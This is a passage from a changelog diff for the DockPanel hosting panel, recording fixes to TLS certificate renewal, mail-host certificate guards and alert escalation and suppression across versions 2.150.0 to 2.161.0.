+The worst case this closes is the DNS-01 wildcard door, whose write target is the
+Cloudflare **zone apex** — the directory every sibling vhost in that zone points
+at — so a single unguarded order there could have taken an unbounded number of
+sites down at once.
+
+### Fixed — the mail door's certificate guard was absent for exactly the domains that needed it
+
+`provision_mail_host_cert` asked the issuer question inside `if let Some(site)`,
+so it asked only about a domain that owns a `sites` row. A Compose stack's domain
+**can never** own one, and a Docker app's cannot either — so for the population
+with no other protection here, a check that read as present was doing nothing.
+It is now asked for every mail host, and still skipped only where the site's own
+columns already settle it.
+
+### Added — the panel can say when a Compose stack's certificate expires
+
+`docker_stacks` gained an `ssl_expiry` column (migration 118). It is written when
+the scheduled renewal succeeds and bootstrapped from the agent's own record the
+first time an administrator opens **Certificates**; it is cleared when a stack
+changes domain or leaves ACME mode, because a date about a certificate the row no
+longer owns is worse than no date at all.
+
+The visible payoff is an outage: when a server's agent cannot be reached, its
+site certificates stayed on the page — the panel stores their expiry — while
+every stack certificate simply **vanished**, at exactly the moment an operator is
+most likely to be looking. They are now listed from the panel's own record and
+marked as such.
+
+### Fixed — the Certificates page can finally do something about a stack's certificate
+
+The page rendered *"Not managed here"* over a certificate DockPanel had issued
+and, since 2.161.0, renews every week. Both of its controls address a site, and a
+stack has no site row. Stack rows now carry a **Renew** button with a route that
+can reach them, guarded by the same mode and issuer checks as the scheduled
+renewal, and refusing with a sentence rather than a reference number.
+
+### Fixed — one host's stack renewal could mute another's
+
+The six-hour cooldown added in 2.161.0 counted attempts by domain alone while the
+lookup beside it is scoped per server. On a fleet carrying the same domain on two
+hosts they shared one budget, so a success on one could hold the other's renewal
+back.
+
+## [2.161.0]
+
+### Fixed — a Compose stack's Let's Encrypt certificate is now renewed on a schedule
+
+A stack that claimed a domain in ACME mode received a ninety-day certificate and
+nothing ever re-ordered it. Both scheduled renewers select `FROM sites`, and a
+stack's domain can never own a `sites` row — `domain_claim` reserves the name for
+the stack — so neither could ever reach one. The certificate was reissued only as
+a side effect of an operator saving the stack, because the deploy path orders
+unconditionally. A stack edited more often than every ninety days therefore never
+lapsed by accident, and one left alone lapsed with certainty.
+
+It was not silent, which made it worse. The agent's weekly walk of
+`/etc/dockpanel/ssl` **did** raise a critical `ssl_expiry` finding naming the
+domain — and the operator then met two dead ends: remediation text pointing at
+the Sites panel, where the certificate is not, and a Diagnostics **Fix** button
+that answered *"this is a certificate DockPanel does not manage"* about a
+certificate DockPanel itself had issued.
+
+**What now happens.** The weekly security scan — the only automatic renewal on a
+stock install, since auto-healing is opt-in and seeded off — resolves a finding
+it cannot match to a site against `docker_stacks` on the host that raised it, and
+renews the certificate in place. The agent reloads nginx rather than re-rendering
+a vhost the panel cannot describe, because only the agent knows a stack's
+published port. A failure raises an alert that a later success **clears**.
+
+**What it will not touch.** A stack serving a registered certificate is declined:
+its certificate is the operator's own and lives outside the per-domain tree. And
+as at every other renewal door, the installed certificate's **issuer** is checked
+first — a certificate DockPanel did not issue is never replaced, however the
+database describes the stack. A certificate whose issuer cannot be read is still
+renewed, because refusing on doubt would let a real certificate lapse.
+
+### Fixed — the Diagnostics fix button no longer disowns a certificate the panel issued
+
+The "who claims this domain" lookup behind that refusal knew about mail domains,
+Git deploys and Docker apps, but not Compose stacks, so a stack's domain fell
+through to the sentence reserved for certificates from outside DockPanel. Stacks
+now join that list, matched case-insensitively like every other reader of the
+column. A stack serving a registered certificate gets its own sentence: the
+expiring file is a leftover, nothing serves it, and removing it is safe.
+
+## [2.160.0]
+
+### Added — a certificate can be registered once and referenced by name when a stack claims a domain (#104)
+
+A Compose stack that claims a domain had two ways to be served: an ACME address,
+and the panel ordered a Let's Encrypt certificate for it; or no address, and the
+vhost was written with no TLS at all. An operator already covered by a
+certificate they manage elsewhere — a Cloudflare Origin CA wildcard, a commercial
+certificate, a corporate PKI — had no way to say so, and every panel-claimed
+subdomain started a second, ninety-day certificate lifecycle beside the one that
+needed none.
+
+**Registered certificates.** Under Monitoring → Certificates an administrator
+now registers a certificate and its key **once**, under a name of their
+choosing, and the Deploy Multi-Container form offers a third way to serve the
+domain — **Registered certificate**, chosen by that name. The pair lives only on
+that server's disk, in its own directory beside the per-domain tree: never in
+the database, and never where the teardown of one stack or the renewal of one
+domain could reach it. The page lists what each certificate covers, who issued
+it, when it expires and which stacks use it; a certificate can be replaced in
+place, and cannot be deleted while a stack still names it.
+
+**The certificate is checked before anything is written.** At registration the
+agent parses the certificate, confirms the private key belongs to it — the check
+nginx would otherwise make at the first reload after a claim — and refuses a key
+pasted into the certificate field. At claim time the panel asks the agent whether
+the certificate actually names the domain, the same subjectAltName check the
+per-site upload has performed since v2.148.0, **before** any row is written or
+any container started; a wildcard for the wrong zone is refused with the names it
+does cover, not discovered by a browser. The deploy asks once more before it
+writes the vhost, in case the pair was replaced in between.
+
+API: `GET`/`POST /api/tls-certificates`, `PUT`/`DELETE /api/tls-certificates/{id}`;
+`POST /api/stacks` and `PUT /api/stacks/{id}` take `tls_mode` (`none`, `acme`,
+`provided`) and `tls_certificate` (the alias).
+
+### Fixed — a stack's TLS mode is now stored, so an edit that says nothing about TLS changes nothing about TLS
+
+The agent decided whether a domain got HTTPS from one signal: whether the deploy
+carried an ACME address. That was the only signal, so `PUT /api/stacks/{id}`
+forwarded whatever address the request carried — and an edit that omitted it
+rewrote the vhost without its `:443` block, behind the one-year HSTS header the
+previous vhost had already sent. Nothing in the shipped UI calls that route yet,
+which is why nobody had met it; the design accepted on #104 needed a stored mode
+before a supplied certificate could safely exist, and this is it.
+
+Each stack now records how its domain is served — `none`, `acme` or `provided` —
+and sends that on every deploy, redeploy and rollback. On an update an absent
+field means **keep**: the mode, the address, the certificate and the domain
+itself all stay as stored unless the request names them (an explicit `null`
+vacates the domain, and a vacated domain has no mode). A registered certificate
+that does not reach the vhost — the alias missing from that server, a certificate
+that no longer covers the domain, a reload that failed — is answered as an error
+naming the cause, never as a domain quietly served over plain HTTP; the vhost is
+left exactly as it was.
+
+**Older agents are refused, not trusted.** An agent from before this release
+ignores the fields it does not know and would write a plain-HTTP vhost for a stack
+that asked for a registered certificate, answering success. The panel reads the
+agent's own version before a registration or a provided-mode claim and refuses
+with a sentence naming the release to update to — fail-closed, because the
+failure it prevents is silent.
+
+Rows written before this release derive their mode from the address they hold,
+exactly as the agent always inferred it. Traefik has no file-certificate form, so
+a registered certificate is nginx-only and a Traefik-routed request is refused in
+words. Nothing renews a registered certificate: the panel renews only the Let's
+Encrypt certificates it issued, as before, and the page says so.
+
+`certificate-registry-pin-e2e.sh` (126 assertions) pins the stored mode reaching
+all three deploy bodies, the keep-if-absent edit, the fail-closed agent gate with
+its frozen constant, the agent's provided arm running before the HTTP-first write
+and never through the per-domain enabler, the registry root as a sibling of the
+per-domain tree, the upload's check-before-write order, and one mode vocabulary
+derived from the migration, both crates and the page.
+
+## [2.159.0]
+
+### Fixed — four monitoring reads answered a failed query with an empty list
+
+Four reads in the monitoring routes discarded their error and returned an empty
+result instead. In every case the page then rendered that emptiness as a fact,
+and the fact was reassuring:
+
+* **Certificates** said **"No SSL certificates found"** — the same sentence it
+  shows a tenant who genuinely has none.
+* **The public status page** returned a page with no monitors on it, which reads
+  as nothing being wrong. It is the page people open precisely when they suspect
+  something is.
+* **The response chart** drew an empty 24 hours.
+* **Maintenance windows** showed none — and that one is the worst of the four,
+  because uptime checks skip every monitor belonging to an account with a live
+  window. The screen said nothing was muting anything while something was, and
+  the delete control that is the way out was not offered, because the row it
+  belongs to was never drawn.
+
+All four now report the failure. The admin certificate list already did, and was
+the template for the other four.
+
+The Certificates page also stops describing a failed read as an empty one: the
+count line says the list is unavailable rather than that there are no
+certificates, and a later successful load retracts the error rather than leaving
+the banner to outlive the request it described.
+
+### Added — a certificate can now say its renewal is failing
+
+Every rung of the certificate status ladder was a function of the clock —
+expired, critical, warning, ok, and unknown for a certificate whose expiry the
+panel does not know. None of them could say that the machinery meant to replace
+the certificate is failing right now, so a certificate with three hundred days
+left and a failing renewal read **OK** until its last month.
+
+v2.157.0 made renewal-failure alerts resolve themselves on a successful renewal,
+which sharpened the gap rather than closing it: a failure that gets fixed now
+disappears from the alert list, and one that is *not* fixed had nowhere on the
+certificate page to appear.
+
+Both certificate lists now show **Renewal failed** for a site with a live
+renewal-failure alert. It sits below *expired* — that outage has already
+happened and no longer turns on the renewal — and above everything else, because
+the other rungs say when the certificate dies while this one says nothing is
+coming to save it. The days column still carries the clock.
+
+Three of the six renewal conditions mean a renewal did not happen, and only
+those three light the rung. A certificate issued by somebody else, a renewal
+deliberately refused to protect a wildcard, and one that succeeded while
+covering fewer names are all standing descriptions of the certificate you have
+— not failures to renew — and the panel does not report them as such. The rung
+reads live alerts only, so it clears itself when the renewal next succeeds.
+
+## [2.158.0]
+
+### Fixed — switching an alert type off did not stop it escalating
+
+The per-type switch in Settings decides whether an alert is recorded at all.
+It had exactly one caller, inside `try_fire_alert`, so it governed the moment an
+alert was *created* and said nothing about one that already existed. The
+escalation sweep selects on `status = 'firing'` alone and is provenance-blind.
+
+So an alert that was already firing when you switched its type off carried on
+re-paging every thirty minutes — for up to the seven days the sweep can still
+see it. The one control that means *do not tell me about this* went on telling
+you, and the only way to stop it was to acknowledge or resolve the alert you had
+just said you did not want to hear about.
+
+The sweep now consults the switch before it pages, memoized per tick so a
+capped 500-row sweep cannot turn into 500 extra queries a minute. A skipped row
+is **not** stamped as escalated: that field means *this row was paged at this
+time*, and writing it for a page that never went out is the same false stamp the
+maintenance-window code documents as the reason it suppresses at each check's
+source. Switch the type back on and it pages on the next sweep.
+
+Types with no per-type column — `slow_response`, `security`,
+`ssl_renewal_failure`, the `container_*` family and six others — are unchanged
+and still escalate. The switch covers ten of the twenty alert types.
+
+### Added — Record and Notify are now two visible columns, not one grid and a hidden API
+
+Seven of those per-type columns had no control in the panel at all. The backend
+read them, the export wrote them and the importer restored them, but the
+Settings page never sent them: the only way to switch one off was to export the
+config, edit the JSON by hand and import it back. The eighth, GPU, had a
+checkbox — which is why the gap was easy to miss.
+
+**Settings** > **Notifications** > **Alert Behaviour** now shows one row per
+alert type with two checkboxes:
+
+- **Record** — off means the alert is never created. No row, no bell, no
+  status-page incident, nothing to escalate.
+- **Notify** — off means the alert is recorded as usual and only the external
+  send is suppressed: Slack, Discord, PagerDuty, webhooks.
+
+These were always two different switches; they are now two columns of one table
+instead of a checkbox grid and an unreachable set of columns. Ten types have a
+**Record** switch (the three GPU types share one, as the backend always did);
+the other ten show a dash and are always recorded.
+
+The grid this replaces read invertedly — ticked meant *suppressed*. Both columns
+now read positively: ticked means it happens.
+
+### Fixed — a design accepted with a reporter was recorded wrong in the code
+
+The `#104` breadcrumb in the agent said three points were binding and then
+listed the wrong third one. The reporter's third point was **SAN validation at
+claim time**, which they called the most valuable of the three because its
+failure is silent; the comment instead recorded renewal suppression, which was
+never put to them. Points one and two were verbatim.
+
+Corrected, with the part that matters for whoever builds it: the SAN check does
+not need writing. `cert_covers_domain` already exists, is unit-tested for
+wildcards, the Common Name fallback and partial-wildcard refusal, and is called
+from the certificate upload path — in the agent, which is exactly where the
+reporter said the check belonged.
+
+## [2.157.0]
+
+### Fixed — a certificate alert that never cleared, so fixing the problem stopped nothing
+
+`ssl_renewal_failure` had nine producers and no resolver. Nothing anywhere
+cleared one: not the twelve `resolve_alert` call sites, not the renewal-success
+path, not the retention purge, which only collects rows already marked resolved.
+
+So a certificate failed to renew, the alert fired at `critical`, the operator
+fixed the cause, and the certificate renewed — and the alert kept firing. The
+escalation sweep re-paged it every thirty minutes for up to seven days, the
+Alerts list never returned to green, and the panel said two opposite things at
+once, because the *expiry* alert beside it did resolve and reported the
+certificate "valid again".
+
+A successful renewal now clears the renewal alerts it disproves, on both loops
+that renew — the auto-healer and the security scanner.
+
+**Three of the six keys, and the split is the point.** `failed`, `blocked` and
+`dns01_declined` all say a renewal did not happen, and a renewal happening is
+what makes them false. The other three describe the certificate installed *now*
+and survive: `dns01_downgraded` means names stopped being covered and they stay
+uncovered, `declined` means the installed certificate is somebody else's, and
+`mail_host_conflict` means a mail host's certificate was refused to protect a
+wildcard. Renewing does not contradict any of them.
+
+### Fixed — switching an alert type off published it on your status page
+
+`alert_rules` carries a per-type on/off switch for eight alert types, and
+turning one off suppressed the alert completely: no row, no bell, nothing sent.
+But the function that fires alerts reported success either way, and its caller
+believed it. Two things went wrong downstream, both in the reassuring
+direction.
+
+The caller auto-creates a status-page incident for critical alerts, marked
+visible. So the one control that means *"do not tell me about this"* was the
+control that told everybody: the alert vanished from the operator's own panel
+and appeared on their public status page.
+
+And the SSL warning ladder stamps "already warned at this rung" only when a page
+actually lands — deliberately, so a page that failed cannot consume a rung.
+Reported as sent, a switched-off `ssl_expiry` consumed rungs anyway, and since
+the ladder only ever fires a *tighter* rung than the one stamped, switching the
+type back on did not bring them back.
+
+### Fixed — the alerts page offered a filter that could never match, and none for slow responses
+
+`Flapping` was a label with no producer anywhere in the backend, so selecting it
+always returned an empty list. `slow_response` was the reverse: produced, but
+missing from the label map, so its badge printed the raw column name and the
+filter could not select it at all. Both are now correct, and a regression pin
+compares that map against the backend vocabulary — the suppression grid beside
+it had been pinned for releases, this one never had been, which is why the drift
+survived in both directions at once.
+
+### Fixed — importing a configuration silently switched off three kinds of alert
+
+The config importer defaulted `alert_backup_failure`, `alert_ssl_expiry` and
+`alert_service_health` to **off** when the field was absent, while CPU, memory,
+disk and offline defaulted **on**. The database declares all seven `DEFAULT
+TRUE`. A configuration written by an older DockPanel, hand-edited, or produced
+by anything but this build's own export therefore turned off backup, certificate
+and service-health alerting on import, with nothing to say so.
+
+### Fixed — the extension "Test webhook" button followed redirects
+
+Extension webhook *delivery* refuses redirects and re-checks the URL against
+internal addresses at send time. The **Test** button did neither: it built its
+own HTTP client that set only a timeout, so the default redirect-following
+applied, and it echoed the response body back to the caller. A stored webhook
+URL that redirects to an internal address was therefore readable, not merely
+reachable. It is admin-only, and it now uses the same client and the same
+send-time check as delivery.
+
+### Documentation — Git Deploy storage (#118)
+
+The source comment above the Git Deploy container configuration announced *five*
+constraints over a list of **six**, and said the first was the one that turns a
+patch into a regression. The sixth is the one that says shipping the other five
+alone destroys existing data on the first deploy after the fix. Corrected.
+
+The Git Deploy guide's warning about persistent storage is now linked from the
+top of the guide, where somebody creating their first deploy will see it, and
+the New/Edit Deploy form carries it too — the half of that commitment that had
+not shipped.
+
+## [2.156.0]
+
+### Fixed — adding mail for a domain could destroy that domain's certificate
+
+Creating a mail domain fires an automatic certificate issuance for the mail
+host. That issuance is an ordinary HTTP-01 order for a single name, and the
+agent writes the result to `/etc/dockpanel/ssl/<domain>/fullchain.pem`
+unconditionally.
+
+That file is not the mail host's private property. A site of the same name
+reads it — and so does a **DNS-01 wildcard**, which DockPanel stores under the
+zone apex, which is exactly the name a mail domain is normally created at. So
+adding mail for `example.com` on a server already holding a wildcard for
+`*.example.com` replaced a certificate covering every subdomain with one
+covering `example.com` alone. Every sibling vhost reading that same file —
+`app.`, `www.`, `staging.` — immediately began serving a certificate that does
+not cover it, and browsers refused them. The same happened to an uploaded
+commercial or Origin-CA certificate.
+
+The vhost repair added in v2.150.0 could not help: it restores the site's
+*configuration*, and what was lost was the file that configuration points at.
+
+Mail auto-SSL now takes a verdict before it orders anything. It declines when
+the name already holds a DNS-01/wildcard certificate, or one DockPanel did not
+issue, and raises a `warning` alert naming what it protected and where to issue
+a certificate deliberately if that is really what you want.
+
+**Two checks, and neither is redundant.** The wildcard case is decided from the
+site's own `ssl_wildcard`/`ssl_challenge` columns, because the issuer probe is
+blind to it — `foreign_cert_issuer` folds "ours" and "we could not tell" into
+one answer, so a Let's Encrypt wildcard reads as ours. The uploaded-certificate
+case is decided from the issuer, because it carries none of our columns. Each
+covers exactly what the other cannot see.
+
+**What has not changed:** a mail domain with no same-named site still gets its
+certificate, and so does one whose site holds an ordinary single-name
+certificate that a re-issue merely refreshes — the "set the mail up first, add
+the website after" order the mail entitlement is built on.
+
+### Fixed — two identical auto-DNS legs are now one
+
+The Cloudflare and PowerDNS branches reached the certificate order through
+byte-identical blocks. They call one guarded function now: a guard applied to
+one leg and not the other is a failure this project has shipped before.
+
+### Internal
+
+`severity_color_tests` moved to the end of `notifications.rs`. Every regression
+suite's source reader blanks from the first `#[cfg(test)]` to end-of-file, so a
+test module in the middle of a file hides everything below it from every
+source-analysis check — here that was 91% of the file. No check was measuring
+an empty subject yet; the first one written over that file was.
+
+## [2.155.2]
+
+### Fixed — a stored-critical certificate could reach PagerDuty as "error"
+
+Every alert is fired with a real severity — `critical`, `warning` or `info` —
+recorded on the row and used to colour the initial page. But the outbound
+payload for every channel (PagerDuty's own `severity` field, the webhook JSON,
+the `{{severity}}` template token) was never given that value. Instead it
+keyword-scanned the subject line — "DockPanel Alert: <title>" — for words like
+"FAIL", "down" or "critical", and fell back to the generic `"error"` for
+anything that didn't happen to contain one. A certificate alert stored as
+`critical` reached PagerDuty as `"error"` unless its title happened to spell
+the word out; the same was true for offline servers, crash-looping containers,
+CPU/memory/disk and backup failures — effectively every alert type this panel
+raises.
+
+The stored severity now travels with the alert all the way to the send: through
+the escalation-policy dispatch, through every route shape (a routed user, an
+on-call schedule, the alert owner's own channels, and a step-level webhook), to
+the payload each channel actually sends. The keyword guess still exists — it is
+the right tool for the handful of notifications that have no stored severity to
+draw on — but a fired alert no longer needs to be guessed at.
+
+### Fixed — an escalated warning looked exactly like an escalated critical
+
+The re-page an unacknowledged alert gets on escalation hardcoded red and
+"investigate immediately" for every severity, because the query behind it never
+selected the alert's own `severity` column in the first place. A firing warning
+that had gone unacknowledged for 15 minutes was escalated with the same colour
+and urgency as a firing critical. It now reads the row's real severity and
+colours the re-page the same way the initial page does — both now draw from one
+shared mapping instead of two copies that were free to drift.
+
+## [2.155.1]
+
+### Fixed — the twentieth alert type is suppressible after all
+
+v2.155.0 listed nineteen of the twenty alert types in the suppression grid and
+left out slow-response deliberately, reasoning that it is recorded by a path
+which never reaches the external channels, so a checkbox for it would switch off
+nothing.
+
+That was half right and it was the wrong half. The *firing* event does bypass
+those channels — that part is true, and it remains a fault to fix in its own
+right. But the matching *recovery* message ("response time is back under the
+threshold") goes out the normal way and does respect the suppression list. So the
+entry governs every external message that alert type actually sends today, and
+leaving it out meant the new validation refused a stored value that had been
+working for anyone who had set it by hand.
+
+All twenty are listed now, with no exemptions, and the check that compares the
+list against what the panel really raises no longer carries one either.
+
+### Fixed — a muted alert type could still reach you through an escalation webhook
+
+v2.155.0 widened the suppression grid from ten alert types to nineteen. The text
+above that grid says a muted type will not trigger Slack, Discord, PagerDuty or
+webhook notifications. That was true of three of the four ways an escalation step
+can be routed, and not the fourth.
+
+A step routed straight at a webhook URL has no user behind it, so it was the one
+route that consulted nobody's preferences — and therefore the one route a mute
+could not reach. Steps routed to a user or an on-call schedule go through the
+per-user fan-out and honour the mute; the webhook step sent regardless. Widening
+the grid made that matter for nine more alert types, so it is fixed here rather
+than left for later: a step-level webhook now checks the alert owner's
+suppression list, the same list the grid edits, and stays silent when the type is
+muted.
+
+## [2.155.0]
+
+### Fixed — an escalation policy could stop paging you altogether
+
+An escalation policy is the thing you build when you want to be woken up. It is
+an ordered chain: page me now, page me again in fifteen minutes, then page the
+whole team. Until this release, once the chain reached its last step the alert
+went quiet — permanently, for as long as it kept firing, until somebody
+acknowledged it by hand.
+
+That made attaching a policy *worse* than attaching nothing. An alert rule with
+no policy re-pages every thirty minutes for as long as the alert is still there.
+An alert rule with a policy stopped. And because the "New policy" button starts
+you with a chain of exactly one step, the ordinary result of building your first
+escalation policy was a single page at the moment the alert fired and then
+silence — on a server that had gone offline, a container in a crash loop, or a
+certificate that had already expired.
+
+The documentation said the opposite, in plain words: escalation repeats every
+thirty minutes until the alert is acknowledged or resolved. That is now what
+happens. When a chain runs out it keeps re-paging its final step on the same
+thirty-minute cadence, so an unacknowledged alert never goes quiet on its own.
+Chains that still have steps left behave exactly as before.
+
+### Fixed — half the alerts that can page you had no off switch
+
+Settings → Notifications offers a grid of checkboxes for suppressing alert types
+from Slack, Discord, PagerDuty and webhooks. The grid listed ten types. DockPanel
+raises twenty. The ten it listed were the ten that existed when the grid was
+written, and everything added since — every certificate renewal failure, failed
+cron jobs, backup verification failures, security scan findings, container
+crashes, memory-leak and disk-forecast warnings — could page you with no way to
+turn it down.
+
+The gap was worst where it mattered most. Certificate renewal failures are raised
+from eight places and four of them are critical, and the one checkbox that looked
+like it covered them was labelled "SSL" — it governed certificate *expiry*, a
+different alert entirely. So the switch you could see controlled something other
+than the thing paging you, and the thing paging you could not be switched off.
+
+Nineteen of the twenty are now listed, and the ambiguous "SSL" box is split into
+"SSL expiry" and "SSL renewal". The twentieth, slow-response, is left out on
+purpose: it is recorded by a path that never reaches the external channels, so a
+checkbox for it would switch off nothing — which is the fault being fixed here,
+not one to spread. It will join the grid when that path is corrected.
+
+Two related repairs come with it: a suppression entry naming an alert type
+DockPanel does not raise is now refused when you save it, instead of being stored
+and quietly matching nothing for ever; and the Alerts page now labels and filters
+the four types it used to print as raw database values.
+
+## [2.154.0]
+
+### Fixed — a warning about one certificate problem silenced the alarm about a worse one
+
+Every alert about a certificate that will not renew was filed under the same
+subject. DockPanel raises five different ones for a site — the certificate was
+issued by somebody else, the renewal failed, the renewal could not be attempted,
+the Cloudflare zone is missing, the certificate was downgraded — and four of the
+five are critical. Because they shared a subject, the alert system treated them
+as repeats of each other and sent only the first for twelve hours.
+
+The first one is usually the least serious. A site whose Cloudflare zone has gone
+gets a warning saying so, roughly twice a day, for as long as the zone stays
+missing. That warning was enough to suppress the critical alert that follows it:
+the one that says the certificate has just been reissued **without** the extra
+hostnames it used to cover. Because the warning repeats until the moment the
+downgrade happens, the downgrade alert was always inside the silenced window, and
+that alert only ever fires once per site — so it was not delayed, it was lost.
+Nothing else reported it: the alert is suppressed before every channel, the panel
+bell included, and the certificate list only ever shows an expiry date.
+
+Worse, the downgrade renews the certificate, so the separate expiry alert saw a
+healthy date again and announced *"SSL certificate renewed"*. The only message
+that arrived said everything was fine.
+
+The five conditions are now five separate subjects. Repeat suppression still
+works exactly as before within each one, and both background loops still
+collapse to a single alert when they notice the same problem on the same
+certificate — you will not get duplicates. What changed is that a warning can no
+longer stand in for a critical.
+
+### Fixed — six-day certificates skipped the warning and went straight to the downgrade
+
+When a certificate issued over DNS-01 comes up for renewal and its Cloudflare
+zone is no longer reachable, DockPanel refuses the renewal while there is still
+time to fix it and tells you what to repair. Only in the certificate's last week
+does it give up and reissue a reduced, single-name certificate on purpose.
+
+"Last week" was seven days for every ACME profile, including `shortlived`, whose
+certificates only live about six days in total. A certificate that never has more
+than six days left is always inside its last seven, so the refusal could never
+happen: every such renewal went straight to the silent downgrade, and the owner
+was never told while the zone was still repairable.
+
+The threshold now depends on the profile, and the rule it has to satisfy is
+pinned rather than the number: the cut-off must sit below the point where
+renewals start for that profile, or the warning can never be reached. Nothing
+changes for the default profiles, and the last-resort downgrade still happens
+before expiry, so a site never loses its certificate entirely.
+
+## [2.153.0]
+
+### Fixed — the panel told you to replace a certificate on a page with no way to replace it
+
+When DockPanel declines to renew a certificate it did not issue — a commercial
+certificate, a Cloudflare Origin CA certificate, a corporate PKI certificate —
+it says so and tells you to *"install a replacement under the site's SSL tab
+instead"*. It says it in three places: the Renew button's refusal, the
+security scanner's alert when it finds such a certificate expiring, and the
+DNS-01 renewal refusal.
+
+There was nothing on that tab to do it with. Every SSL control on the site page,
+the upload form included, only appeared while SSL was **off**. Once a site had a
+certificate the page showed a padlock and an expiry date and nothing else — so
+the one instruction the panel gives you at exactly the moment it matters could
+not be followed. Renewing from the certificate list and revoking are both
+admin-only, which meant a site's own owner, on a non-admin account, holding a
+certificate about to expire, had no way forward at all.
+
+The upload form is now shared by both states rather than living inside the
+"not configured" branch, and an SSL-enabled site has a **Replace certificate**
+control that opens it. Nothing about how certificates are renewed has changed,
+and the refusals are still correct: renewing a certificate DockPanel did not
+issue would replace it. You can now do what they ask.
+
+### Fixed — every secured site was labelled "Let's Encrypt", including ones that were not
+
+The SSL row asserted `Enabled (Let's Encrypt)` for every site with a certificate
+installed, whoever issued it. So a site carrying an uploaded commercial
+certificate was described as holding a Let's Encrypt one — on the same panel
+that had already refused to renew it *because* it came from somewhere else, in a
+message naming the real issuer.
+
+The row now shows the issuer the certificate actually carries, and a certificate
+DockPanel did not issue is labelled with its own issuer plus a line saying the
+panel will not renew it. The backend already knew this: the answer is computed
+from the certificate status it was already fetching, so the honesty costs no
+extra work.
+
+**"We could not tell" is now its own answer.** If the agent cannot be reached,
+or the site is served by a wildcard certificate stored under its zone's name
+rather than its own, the row reads a plain `Enabled` — never a CA's name.
+Guessing there is what produced the original claim, and it would have looked
+right in every test, because in a test the agent is up.
+
+## [2.152.0]
+
+### Fixed — two sites created at once could leave both certificates unrenewable
+
+Creating two sites at the same moment on a fresh install could mint **two
+different Let's Encrypt accounts**, and every certificate issued under the one
+that lost the race then failed to renew — permanently, and silently.
+
+Each site's automatic SSL runs in its own background task, and both tasks ask
+for the ACME account the same way: look for the account file, and create an
+account if it is not there. Creating one is a round trip to Let's Encrypt, so on
+a fresh box both tasks looked before either had finished writing, both created a
+distinct account, and the second write replaced the first. The certificate
+issued under the replaced account was still valid and still served — but its
+account key was no longer anywhere on disk.
+
+That only surfaced later, at renewal. Every renewal names the certificate it is
+replacing (RFC 9773 ARI), the CA answered *"requester account did not request
+the certificate being replaced"*, and the order was refused. There is no path
+that retries without that hint, so the renewal failed on every attempt until the
+certificate expired and the site stopped loading, behind a panel that had
+reported the original issuance as successful.
+
+Measured on a throwaway box with real DNS and real Let's Encrypt issuance,
+before and after, with the agent binary as the only variable. Before: two sites
+created together produced **two** accounts 163 ms apart, both sites got real
+certificates, and renewal was refused with the ARI error. After: **one** account,
+the second task logging *"Loaded existing ACME account"*, both sites again
+holding real certificates, and both renewing normally.
+
+The account is now resolved under a lock, so the two tasks cannot both create
+one, and the account file is created atomically, so a second *process* — an
+agent restart overlapping a running one — loses the race cleanly and adopts the
+account that is already on disk rather than using the one it just made. The
+guarantee is now explicit: the account a certificate is issued under is always
+the account whose key is stored.
+
+### Security — the ACME account key is owner-only from creation
+
+The same file was written and then `chmod`-ed, leaving the credential that can
+order and revoke this server's certificates briefly readable by any local user.
+It is now created with its permissions already set, the way the TLS private-key
+writer beside it already was.
+
+## [2.151.0]
+
+### Fixed — adding a mail domain silently rewrote the website of the same name
+
+Adding a mail domain for a name that also has a **website** re-rendered that
+website's nginx configuration and left it broken.
+
+The panel asks the agent for a certificate for the mail host. The agent's SSL
+route does not *patch* a vhost for a certificate — it re-renders the whole file
+from the configuration the caller sends, and the mail path sent `runtime:
+"static"` with no document root, no limits and no hardening. That is the right
+body for a mail host and the wrong one for a website, so the website was
+republished as a static site: PHP stopped executing and answered **403** to every
+request, its rate limit and upload cap were dropped, and its custom nginx
+directives disappeared — while the panel went on reporting the site as PHP with
+all of its limits still set. It happened in a background task, so the only thing
+an operator saw was "mail domain added".
+
+Measured on a fresh box in both directions: the site with a mail domain was
+converted to static and returned 403 for PHP, while an identical site on the same
+host with no mail domain was untouched, byte for byte.
+
+The mail path now puts the site's real configuration back after the certificate
+is installed, the way every SSL door in `routes/ssl.rs` already did for its own
+writes. A mail domain that is *not* also a site is unaffected — there is no vhost
+of ours to restore.
+
+### Fixed — a certificate issued during site creation dropped the site's limits
+
+The same shape, one door over and less severe. The auto-SSL task that runs after
+a site is created sends the site's runtime and root but not its per-site limits
+or hardening fields, and that task retries with delays — so a limit set between
+creation and a later attempt was published and then silently dropped. The runtime
+was never affected on this path. It now restores the site's row afterwards too.
+
+### Changed — the regression pin now derives the doors instead of counting the cure
+
+`sibling-parity-pin-e2e.sh` asserted only that the vhost rebuild was *referenced*
+at least five times across the crate. A count cannot say which doors need one, so
+two new SSL-writing doors were added in `routes/mail.rs` and the arm stayed green
+the entire time. It now derives every panel file that calls an agent SSL route
+which re-renders a vhost, and fails when one of them has no compensation — or
+when a door appears that nobody has decided about.
+
+## [2.150.1]
+
+### Fixed
+
+- **Corrects a claim this project made one release ago.** The v2.150.0 note below
+  said that stopping a Git Deploy was reverted by the health monitor within 120
+  seconds. That is not true, and it never was. A fresh-box drive of both versions
+  established why: the agent's app listing keeps only containers carrying a
+  `dockpanel.app.template` label, and a Git Deploy's container carries no such
+  label — so it never appears in that listing, and both the auto-healer and the
+  alert engine read exactly that listing.
+
+  The recording added in v2.150.0 is correct and is kept, but it changes no
+  behaviour today. The v2.150.0 rename fix is unaffected and was driven on the
+  same box, in both directions.
+
+### Known limitation, now documented rather than implied
+
+- **A Git Deploy is not covered by container monitoring.** If its container
+  exits on its own, no `container_down` alert is raised and nothing restarts it.
+  Docker Apps get both. This is long-standing behaviour that no document stated;
+  the Git Deploy guide now says it plainly. Use an uptime monitor against the
+  deploy's URL if you need to be told when it stops serving.
+
+## [2.150.0]
+
+### Fixed
+
+- **Stopping a Git Deploy did not stick.** The Stop button on a Git Deploy asked
+  the agent to stop the container and marked the row `stopped`, but — alone
+  among the panel's five deliberate-stop paths — it did not record the stop as
+  intentional. The health monitor therefore saw an exited container it had no
+  expectation for and restarted it, within 120 seconds, silently, while the
+  panel went on displaying "stopped". Start now clears that expectation, so a
+  genuine crash after a manual start still alerts.
+
+- **Renaming a Git Deploy's domain left the old hostname serving.** Changing the
+  Domain field pointed the deploy at its new hostname but left the previous
+  nginx vhost proxying to the same running container, with a certificate that
+  kept renewing — while the panel released its claim on that name. Another
+  account could then claim the old hostname and be answered by the previous
+  tenant's application. The old vhost and its certificate directory are now
+  taken down as part of the rename, but only when they still belong to this
+  deploy: a hostname something else has taken over since is left untouched, as
+  is a certificate directory another vhost still points at.
+
